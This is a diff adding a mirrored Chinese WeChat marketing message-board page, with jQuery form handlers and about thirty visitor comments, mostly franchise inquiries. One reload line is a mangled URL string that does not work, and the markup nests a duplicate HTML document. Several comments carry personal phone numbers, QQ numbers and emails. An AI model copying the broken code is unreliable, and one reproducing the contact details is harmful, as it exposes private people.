@@ -1,0 +1,4154 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta content="微信营销、微信代运营、微信定制开发、微信托管、微网站、微商城、微营销" name="Keywords">
+	<meta content="盛世源码—国内优秀的微信公众服务平台，国内最大的微信公众智能服务平台，盛世源码—国内优秀的微信公众服务平台八大微体系：微菜单、微官网、微会员、微活动、微商城、微推送、微服务、微统计，企业微营销必备。" name="Description">
+    <link rel="stylesheet" type="text/css" href="/static/wxgjcn/css/message.css-2014-03-07-1.css"  media="all" />
+<script type="text/javascript" src="/static/wxgjcn/src/message/jquery_min.js-2014-03-07-1.js" ></script>
+<title>微留言</title>
+	<link rel="shortcut icon" href="httpimg/favicon.ico" />
+    <!--[if lte IE 9]><script src="/static/wxgjcn/src/watermark.js" ></script><![endif]-->
+	<!--[if IE 7]><link href="/static/wxgjcn/css/font_awesome_ie7.css"  rel="stylesheet" /><![endif]-->
+</head>
+<body>
+	<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+	<title></title>
+	<meta charset="utf-8">
+	<meta content="" name="description">
+	<meta content="" name="keywords">
+	<meta content="eric.wu" name="author">
+	<meta content="application/xhtml+xml;charset=UTF-8" http-equiv="Content-Type">
+	<meta content="no-cache,must-revalidate" http-equiv="Cache-Control">
+	<meta content="no-cache" http-equiv="pragma">
+	<meta content="0" http-equiv="expires">
+	<meta content="telephone=no, address=no" name="format-detection">
+	<meta content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" name="viewport">
+ 
+	<script type="text/javascript"> 
+		$(document).ready(function () { 
+			$("#showcard1").click(function () { 
+				var btn = $(this);
+				var wxname = $("#wxname1").val();
+				if (wxname  == '') {
+					alert("请输入昵称");
+					return;
+				}
+				var info = $("#info1").val();
+					if (info == '') {
+					alert("请输入内容");
+					return;
+				}
+				var submitData = {
+					nickname:wxname,
+					info: info,
+					action: "setly"
+				};
+				$.post('/Webmessage/SubConment?openid=fromUsername&wxid=f156221f78685b7f7be1be1e4ad0d9f0', submitData,
+					function(data) {
+						if (data.success == true) {
+							alert(data.msg);
+							setTimeout('http://www.weimob.com/Webmessage/window.location.href=location.href',1000);
+						return;
+					} else {}
+				},
+				"json")
+			}); 
+			//
+			$("#showcard2").click(function () { 
+				var btn = $(this);
+				var wxname = $("#wxname2").val();
+					if (wxname  == '') {
+					alert("请输入昵称");
+					return;
+				}
+				var info = $("#info2").val();
+					if (info == '') {
+					alert("请输入内容");
+					return;
+				}
+				var submitData = {
+					nickname:wxname,
+					info: info,
+					action: "setly"
+				};
+				$.post('/Webmessage/SubConment?openid=fromUsername&wxid=f156221f78685b7f7be1be1e4ad0d9f0', submitData,
+					function(data) {
+						if (data.success == true) {
+						alert(data.msg);
+						setTimeout('http://www.weimob.com/Webmessage/window.location.href=location.href',1000);
+						return;
+					} else {}
+				},
+				"json")
+			});  
+			//
+			$(".hhsubmit").click(function () { 
+				var objid = $(this).attr("date");
+				var info = $(".hly"+objid).val();
+					if (info == '') {
+					alert("请输入内容");
+					return;
+				}
+				var submitData = {
+					nickname:'',
+					fid:objid,
+					info: info,
+					action: "setly"
+				};
+				$.post('/Webmessage/SubConment?openid=fromUsername&wxid=f156221f78685b7f7be1be1e4ad0d9f0', submitData,
+				function(data) {
+					if (data.success == true) {
+						alert(data.msg);
+						setTimeout('http://www.weimob.com/Webmessage/window.location.href=location.href',1000);
+						return;
+					} else {}
+				},
+				"json")
+			});  
+			//
+			$(".hfinfo").click(function () { 
+				var objid = $(this).attr("date");
+				$(".hhly"+objid).slideToggle();
+			}); 
+			//
+			$(".hhbt").click(function () { 
+				var objid = $(this).attr("date");
+				$(".hhly"+objid).slideToggle();
+			});
+			//
+			$("#windowclosebutton").click(function () { 
+				$("#windowcenter").slideUp(500);
+			});
+			//
+			$("#alertclose").click(function () { 
+				$("#windowcenter").slideUp(500);
+			});
+		}); 
+		//
+		function alert(title){ 
+			window.scrollTo(0, -1);
+			$("#windowcenter").slideToggle("slow"); 
+			$("#txt").html(title);
+			setTimeout(function(){$("#windowcenter").slideUp(500);},4000);
+		}
+		//
+		$(document).ready(function(){
+			$(".first1").click(function(){
+				$(".ly1").slideToggle();
+			});
+			$(".first2").click(function(){
+				$(".ly2").slideToggle();
+			});
+		});
+	</script> 
+</head>
+ 
+<body id="message" onselectstart="return true;" ondragstart="return false;">
+	<div class="container">
+	  	<div class="qiandaobanner">
+		  	<a href="javascript:history.go(-1);">
+		  		<img src="/static/wxgjcn/img/message/mpic.jpg"  style="width:100%;" />
+		  	</a>
+	  	</div>
+
+		<div class="cardexplain">
+			<div class="window" id="windowcenter">
+				<div id="title" class="wtitle">操作提示<span class="close" id="alertclose"></span></div>
+				<div class="content">
+					<div id="txt"></div>
+				</div>
+			</div>
+ 
+			<div class="history">
+				<div class="history-date">
+					<ul>
+						<a><h2 class="first first1" style="position: relative;">请点击留言</h2></a>
+						<!--<li class="nob  mb"><div class="beizhu">留言审核通过后才会显示在留言墙上！</div></li>-->
+						<li class="green bounceInDown nob ly1" style="display:none">
+							<dl>
+								<dt>
+									<input name="wxname" type="text" class="px" id="wxname1" value="" placeholder="请输入您的昵称">
+								</dt>
+								<dt>
+									<textarea name="info" class="pxtextarea" style=" height:60px;" id="info1" placeholder="请输入留言"></textarea>
+								</dt>
+								<dt><a id="showcard1" class="submit" href="javascript:void(0)">提交留言</a></dt>
+							</dl>
+						</li>			
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								杨生<span>2014-03-31 00:08:34</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="49872">请问现在有什么优惠？</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="49872" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly49872">
+											<textarea name="info" class="pxtextarea hly49872"></textarea> 
+										<a class="hhsubmit submit" date="49872" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								聪哥<span>2014-03-30 20:07:11</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="49800">支持下，天津有没有</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="49800" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly49800">
+											<textarea name="info" class="pxtextarea hly49800"></textarea> 
+										<a class="hhsubmit submit" date="49800" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								小.话<span>2014-03-24 13:37:38</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="47186">不错</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="47186" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly47186">
+											<textarea name="info" class="pxtextarea hly47186"></textarea> 
+										<a class="hhsubmit submit" date="47186" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								某鱼<span>2014-03-20 16:26:47</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="45729">界面做的很漂亮呢，真心赞！</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="45729" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly45729">
+											<textarea name="info" class="pxtextarea hly45729"></textarea> 
+										<a class="hhsubmit submit" date="45729" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								你hao<span>2014-03-02 23:17:59</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="36910">你好</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="36910" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly36910">
+											<textarea name="info" class="pxtextarea hly36910"></textarea> 
+										<a class="hhsubmit submit" date="36910" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+														<dl class="huifu">
+								<dt><span>回复：哈哈，来瞄瞄下 
+																										</span></dt>
+							</dl>
+														<dl class="huifu">
+								<dt><span>朵朵k回复：我想加入你们，我是生产欧式家具得 
+																										</span></dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								123<span>2014-03-02 21:05:11</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="36868">不错</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="36868" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly36868">
+											<textarea name="info" class="pxtextarea hly36868"></textarea> 
+										<a class="hhsubmit submit" date="36868" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								雅聚阁精品店<span>2014-02-28 09:40:07</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="35857">我想加入你们怎么做</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="35857" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly35857">
+											<textarea name="info" class="pxtextarea hly35857"></textarea> 
+										<a class="hhsubmit submit" date="35857" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+														<dl class="huifu">
+								<dt><span>王回复：我想给我的店里做一个？怎么做啊？ 
+																										</span></dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								“”<span>2014-02-27 20:55:56</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="35695">你们的每期案例，里面的材料内容谁提供，是你们负责收集的吗</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="35695" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly35695">
+											<textarea name="info" class="pxtextarea hly35695"></textarea> 
+										<a class="hhsubmit submit" date="35695" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								我靠<span>2014-02-26 14:29:10</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="35062">好事了</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="35062" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly35062">
+											<textarea name="info" class="pxtextarea hly35062"></textarea> 
+										<a class="hhsubmit submit" date="35062" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+														<dl class="huifu">
+								<dt><span>回复：我想加入，我是做工艺品的 
+																										</span></dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								徐鹤<span>2014-02-26 12:30:17</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="35021">不错的平台</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="35021" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly35021">
+											<textarea name="info" class="pxtextarea hly35021"></textarea> 
+										<a class="hhsubmit submit" date="35021" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								join<span>2014-02-26 11:28:21</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="34995">了解一下，试试</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="34995" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly34995">
+											<textarea name="info" class="pxtextarea hly34995"></textarea> 
+										<a class="hhsubmit submit" date="34995" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								zyn<span>2014-02-26 10:47:48</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="34960">现在微信订阅号还可以申请自定义菜单吗</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="34960" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly34960">
+											<textarea name="info" class="pxtextarea hly34960"></textarea> 
+										<a class="hhsubmit submit" date="34960" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								蓝天白云<span>2014-02-26 08:54:42</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="34896">请问天津这边可以做代理吗？代理政策？代理商有自己的logo吗？有自己的管理后台吗？谢谢
+</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="34896" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly34896">
+											<textarea name="info" class="pxtextarea hly34896"></textarea> 
+										<a class="hhsubmit submit" date="34896" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								问天<span>2014-02-25 17:13:50</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="34643">请问做一个微商城微官网带直接购买付款功能的，大概需要多少钱</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="34643" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly34643">
+											<textarea name="info" class="pxtextarea hly34643"></textarea> 
+										<a class="hhsubmit submit" date="34643" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								哈哈<span>2014-02-10 18:05:18</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="29162">不错</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="29162" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly29162">
+											<textarea name="info" class="pxtextarea hly29162"></textarea> 
+										<a class="hhsubmit submit" date="29162" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+														<dl class="huifu">
+								<dt><span>回复：还不错 
+																										</span></dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								lclc<span>2014-02-10 12:02:36</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="29000">你好，请问广东汕头这边有代理了吗？微商城的入驻资格和价格是什么？请回复，谢谢！</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="29000" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly29000">
+											<textarea name="info" class="pxtextarea hly29000"></textarea> 
+										<a class="hhsubmit submit" date="29000" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								大鱼<span>2014-02-07 15:21:06</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="28083">请问360全景看房怎么做，如何收费？
+</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="28083" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly28083">
+											<textarea name="info" class="pxtextarea hly28083"></textarea> 
+										<a class="hhsubmit submit" date="28083" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								男人邦<span>2014-01-07 00:38:37</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="18205">您好，想咨询下目前福建省区是否已有代理，另外申请代理有哪些条件要求？？望回复</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="18205" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly18205">
+											<textarea name="info" class="pxtextarea hly18205"></textarea> 
+										<a class="hhsubmit submit" date="18205" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								你好<span>2014-01-06 17:18:53</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="18062">你好</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="18062" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly18062">
+											<textarea name="info" class="pxtextarea hly18062"></textarea> 
+										<a class="hhsubmit submit" date="18062" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								小君<span>2014-01-06 16:03:13</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="18035">你好，我想加盟需要什么条件，门槛吗？</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="18035" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly18035">
+											<textarea name="info" class="pxtextarea hly18035"></textarea> 
+										<a class="hhsubmit submit" date="18035" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								小笙<span>2014-01-05 21:56:44</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="17804">想问一下图文列表链接怎么添加？</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="17804" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly17804">
+											<textarea name="info" class="pxtextarea hly17804"></textarea> 
+										<a class="hhsubmit submit" date="17804" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								嘿诶嘿嘿<span>2014-01-05 19:49:55</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="17778">请问如何与贵公司合作？</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="17778" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly17778">
+											<textarea name="info" class="pxtextarea hly17778"></textarea> 
+										<a class="hhsubmit submit" date="17778" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								kikm<span>2014-01-04 15:46:15</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="17404">不错</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="17404" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly17404">
+											<textarea name="info" class="pxtextarea hly17404"></textarea> 
+										<a class="hhsubmit submit" date="17404" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								秦淮河畔<span>2014-01-02 01:17:49</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="16657">这套系统很不错哦</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="16657" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly16657">
+											<textarea name="info" class="pxtextarea hly16657"></textarea> 
+										<a class="hhsubmit submit" date="16657" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								果子<span>2014-01-01 17:47:52</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="16546">我是增强版用户，留言板经常性留言不成功，提示“参数错误”。另外，微会员卡希望能增加减积分操作；会员卡信息导出的内容里并不包含积分数，望加以改进</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="16546" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly16546">
+											<textarea name="info" class="pxtextarea hly16546"></textarea> 
+										<a class="hhsubmit submit" date="16546" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								阿敏<span>2014-01-01 17:03:11</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="16544">你好，我想加盟代理。想问问要求、门槛、条件、费用等。13593645678 QQ48551634</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="16544" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly16544">
+											<textarea name="info" class="pxtextarea hly16544"></textarea> 
+										<a class="hhsubmit submit" date="16544" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								华兴智讯科技<span>2013-12-20 02:45:37</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="11716">刚加盟了，不错，个人微信号ssclw66</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="11716" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly11716">
+											<textarea name="info" class="pxtextarea hly11716"></textarea> 
+										<a class="hhsubmit submit" date="11716" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+														<dl class="huifu">
+								<dt><span>回复：请问你是怎么加盟的，要哪些条件呢？ 
+																										</span></dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								刘<span>2013-12-20 01:48:55</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="11713">你好，我想加盟代理。想问问要求、门槛、条件、费用等。QQ：475164660@qq.com
+</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="11713" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly11713">
+											<textarea name="info" class="pxtextarea hly11713"></textarea> 
+										<a class="hhsubmit submit" date="11713" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								黄山康辉旅行社<span>2013-12-19 13:31:06</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="11548">好是好，还没弄明白怎么玩？继续研究，哈哈</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="11548" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly11548">
+											<textarea name="info" class="pxtextarea hly11548"></textarea> 
+										<a class="hhsubmit submit" date="11548" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								安徽省雅歌文化传媒有限责...<span>2013-12-17 07:39:45</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="10999">未来的市场…好想了解知道我怎么才能够加盟这个微店呢？加盟需要资金吗？加盟需要些什么条件呢？ 我的QQ邮箱418337639@qq.com</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="10999" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly10999">
+											<textarea name="info" class="pxtextarea hly10999"></textarea> 
+										<a class="hhsubmit submit" date="10999" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								浙江温州<span>2013-12-17 01:57:14</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="10998">你好，我想加盟代理。想问问要求、门槛、条件、费用等。电话13355778760。QQ：2401128069</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="10998" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly10998">
+											<textarea name="info" class="pxtextarea hly10998"></textarea> 
+										<a class="hhsubmit submit" date="10998" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								胖虎<span>2013-12-16 18:30:46</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="10938">长见识了 微信太牛逼了</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="10938" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly10938">
+											<textarea name="info" class="pxtextarea hly10938"></textarea> 
+										<a class="hhsubmit submit" date="10938" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								mini<span>2013-12-12 14:26:43</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="9968">hi</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="9968" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly9968">
+											<textarea name="info" class="pxtextarea hly9968"></textarea> 
+										<a class="hhsubmit submit" date="9968" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								宁夏银川<span>2013-12-10 11:02:27</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="9404">你好，你好！我想知道怎么才能加盟这个微店？加盟需要资金吗？加盟需要些什么条件呢？具体程序怎么走？微信号：616704049</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="9404" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly9404">
+											<textarea name="info" class="pxtextarea hly9404"></textarea> 
+										<a class="hhsubmit submit" date="9404" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								石家庄<span>2013-12-09 20:21:36</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
